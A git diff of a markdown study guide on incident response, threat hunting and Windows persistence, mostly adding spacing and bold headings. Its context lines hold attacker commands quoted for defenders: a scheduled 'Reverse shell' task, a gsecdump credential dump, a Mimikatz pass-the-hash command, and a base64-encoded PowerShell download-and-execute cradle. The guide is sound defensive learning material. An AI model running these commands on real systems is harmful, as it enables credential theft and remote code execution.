@@ -1,5 +1,6 @@
 # Notes on DFIR, Threat Hunting, and Malware Analysis
 
+<br>
 
 ### Table of Contents
 - [Incident Response](#incident-response)
@@ -33,7 +34,11 @@
   * [Decode Base64](#decode-base64)
   * [Powershell CommandLine Switches](#powershell-commandline-switches)
 
+<br>
+
 ---
+
+<br>
 
 # Incident Response
 
@@ -75,13 +80,21 @@
 	* Information sharing
 	* Compliance verification
 
+<br>
+
 ## Incident Response Hierarchy of Needs
 <img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />
 
 [Ref: Matt Swann](https://github.com/swannman/ircapabilities)
 
+<br>
+
+
 ## Attack Lifecycle
 <img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />
+
+<br>
+
 
 ## IR Scripting
 
@@ -108,6 +121,9 @@ Network Configuration
 wmic /node:10.1.1.1 nicconfig get
 ```
 
+<br>
+
+
 ### IR Using PowerShell
 - [Live Response Using PowerShell](https://www.sans.org/white-papers/34302/)
 - [Powershell: Forensic One-liners](https://www.ldap389.info/en/2013/06/17/powershell-forensic-onliners-regex-get-eventlog/)
@@ -130,8 +146,11 @@ Authentication
 - Does not cache creds
 - Creds not passed to remote system (Mimikatz, Incognito)
 
+<br>
+
+
 ### Kansa
-Collection
+**Collection**
 - [Kansa GitHub](https://github.com/davehull/Kansa)
 - Uses PowerShell scripting
 - Can remote run executables
@@ -146,7 +165,7 @@ Collection
 .\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
 ```
 
-Analysis
+**Analysis**
 - Can pre-filter and organize data
 - Located in the .\Analysis folder
 - Uses "stacking" (Least Frequency of Occurence)
@@ -155,7 +174,7 @@ Analysis
 	- LogParser (LogparserStack.ps1) to stack unsigned Autoruns output from multiple Kansa output files
 	- [Computer Forensics How-To: Microsoft Log Parser](https://www.sans.org/blog/computer-forensics-how-to-microsoft-log-parser/)  
 
-Distributed Kansa
+**Distributed Kansa**
 - Kansa has issues scaling to 1000+ systems
 - Fixed with .\DistributedKansa.ps1
 - Scripts included to set up distrubted Kansa-Servers
@@ -163,7 +182,7 @@ Distributed Kansa
 - [Kansa for Enterprise scale Threat Hunting w/ Jon Ketchum](https://www.youtube.com/watch?v=ZyTbqpc7H-M)
 - [Kansa for Enterprise Scale Threat Hunting](https://www.sans.org/presentations/kansa-for-enterprise-scale-threat-hunting/)
 
-Enable PowerShell Remoting
+**Enable PowerShell Remoting**
 - Remoting requires that all network connections be set to something other than "Public." 
 
 1. User ```Get-NetConnectionProfile``` to check
@@ -176,6 +195,9 @@ Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
 ```powershell
 .\kansa.ps1 -Pushbin -Target computername -Credential SANSDFIR -Authentication Negotiate
 ```
+
+<br>
+
 ## Kansa Data Stacking Collection and Analysis
 
 ### Stacking Autoruns
@@ -189,6 +211,8 @@ Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
 ```powershell
 Select-String "process name" *Autorunsc.csv
 ```
+
+<br>
 
 ### Stacking Services
 
@@ -208,6 +232,7 @@ Select-String "process name" *Autorunsc.csv
 ```powershell
 Select-String "tbbd05" *SvcAll.csv 
 ```
+<br>
 
 ### Stacking WMI Filters and Consumers
 
@@ -243,20 +268,21 @@ Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
 
 ## SANS Windows Forensic Analysis Poster
 * [Link](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)
-
+<br>
 ---
+<br>
 
 # Threat Hunting
 
 ## Common Malware Names
 * [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)
-
+<br>
 ## Common Malware Locations
 * [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)
-
+<br>
 ## Living of the Land Binaries
 * [LOLBAS Project](https://lolbas-project.github.io/)
-
+<br>
 ## Persitence Locations
 
 ### Common Autostart Locations
@@ -270,9 +296,10 @@ SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
 %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 ```
 
-Tools
+**Tools**
 * Autoruns
 * Kansa
+<br>
 
 ### Services
 ```
@@ -282,10 +309,11 @@ HKLM\SYSTEM\CurrentControlSet\Services
 * 0x00 = Boot Start of a Device Driver
 * "sc" command can create services
 
-Tools
+**Tools**
 * Autoruns
 * "sc" command
 * Kansa
+<br>
 
 ### Scheduled Tasks
 - at.exe
@@ -301,6 +329,7 @@ schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revs
 Tools:
 - Autoruns
 - Kansa
+<br>
 
 ### DLL Hijacking
 
@@ -329,6 +358,7 @@ Common DLL Search Order
 7. C:\Windows
 8. Current Directory
 9. System %PATH%
+<br>
 
 ### Hunting DLL Hijacking
 - Machines rarely get new dlls (Application Install/Patching)
@@ -340,6 +370,7 @@ Memory Analysis
 - Find system process or DLLs loaded from the wrong location
 
 This technique is often followed up C2 network beaconing
+<br>
 
 ### WMI Event Consumer Backdoors
 - Allows triggers to be set that will run scripts and executables
@@ -357,6 +388,7 @@ Get-WMIObject -Namespace root\Subscription -Class __EventFilter
 Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
 Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
 ```
+<br>
 
 ### Hunting WMI Persistence
 - Look at consumers (CommandLine and Active Script)
@@ -381,6 +413,7 @@ Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
 	- KernCap.vbs
 	- NETEventLogConsumer
 	- WSCEAA.exe (Dell)
+<br>
 
 ### Hunt and Analyze Persistence with Autoruns
 - Live System Only
@@ -402,6 +435,7 @@ Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
 5. Compare hashes to VirusTotal
 6. Research vendor and product listed in "Publisher" and "Description" fields
 7. Compare output to a the output of a known good machine
+<br>
 
 ## Lateral Movement
 
@@ -427,6 +461,7 @@ Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
 - WDigest Plaintext Credentials
 	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
 		- UseLogonCredential = "1" (Should be 0)
+<br>
 
 ### Hashes
 - Availabe in the LSASS process
@@ -464,6 +499,8 @@ gsecdump.exe -a > 1.txt
 sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
 ```
 
+<br>
+
 ### Credential Availability on Targets
 
 | **Admin Action** | **Logon**<br>**Type** | **Credentials**<br>**on Target?** | **Notes** |
@@ -484,8 +521,12 @@ sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe 
 - Used for SSO
 - Attacker can impersonate user's security context
 
----
 <br>
+
+---
+
+<br>
+
 # Misc
 
 ## Decode Base64
@@ -493,6 +534,8 @@ sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe 
 ```bash
 echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
 ```
+
+<br>
 
 ## Powershell CommandLine Switches
 - -W: WindowStyle
